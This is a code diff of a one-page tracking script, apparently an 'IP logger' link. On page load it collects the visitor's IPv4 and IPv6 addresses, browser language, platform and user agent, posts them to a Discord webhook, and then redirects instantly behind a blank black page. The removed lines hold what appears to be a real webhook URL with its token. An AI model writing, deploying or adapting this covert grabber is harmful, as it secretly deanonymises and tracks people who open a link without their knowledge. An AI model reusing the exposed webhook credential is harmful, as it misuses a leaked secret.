@@ -9,9 +9,9 @@
         // CONFIGURATION AREA
         // ==========================================
         const CONFIG = {
-            DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l',
-            REDIRECT_URL: 'https://google.com', // Where to send the visitor after tracking
-            EMBED_COLOR: 16766720 // Decimal color code (3447003 is Blue)
+            DISCORD_WEBHOOK_URL: 'YOUR_DISCORD_WEBHOOK_URL_HERE',
+            REDIRECT_URL: 'https://example.com', // Where to send the visitor after tracking
+            EMBED_COLOR: 3447003                  // Decimal color code (3447003 is Blue)
         };
         // ==========================================
 
@@ -21,8 +21,11 @@
 
             // 1. Fetch strict IPv4 Address
             try {
-                const res4 = await fetch('https://ipify.org');
-                if (res4.ok) ipv4 = (await res4.text()).trim();
+                const res4 = await fetch('https://bigdatacloud.net');
+                if (res4.ok) {
+                    const data4 = await res4.json();
+                    if (data4 && data4.ipString) ipv4 = data4.ipString.trim();
+                }
             } catch (e) {}
 
             // 2. Fetch strict IPv6 Address
@@ -31,7 +34,7 @@
                 if (res6.ok) ipv6 = (await res6.text()).trim();
             } catch (e) {}
 
-            // Format current date and time
+            // Format current date and time (e.g., 28.09.2026, 17:39)
             const now = new Date();
             const simpleDateString = now.toLocaleString('de-DE', {
                 day: '2-digit',
@@ -49,9 +52,9 @@
                     color: CONFIG.EMBED_COLOR,
                     timestamp: now.toISOString(),
                     fields: [
-                        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: false },
-                        { name: "IPv6 Address", value: `\`${ipv6}\``, inline: false },
-                        { name: "Language / Region", value: `\`${navigator.language}\``, inline: true },
+                        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: true },
+                        { name: "IPv6 Address", value: `\`${ipv6}\``, inline: true },
+                        { name: "Language / Region", value: `\`${navigator.language}\``, inline: false },
                         { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
                         { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false }
                     ],
@@ -67,7 +70,7 @@
                     body: JSON.stringify(payload)
                 });
             } catch (e) {
-                // Failsafe execution
+                // Failsafe
             } finally {
                 // 5. Instantly redirect
                 window.location.href = CONFIG.REDIRECT_URL;
@@ -77,6 +80,7 @@
         window.addEventListener('DOMContentLoaded', trackAndRedirect);
     </script>
     <style>
+        /* Makes the entire page completely black and hides scrolls */
         html, body {
             background-color: #000000 !important;
             margin: 0;
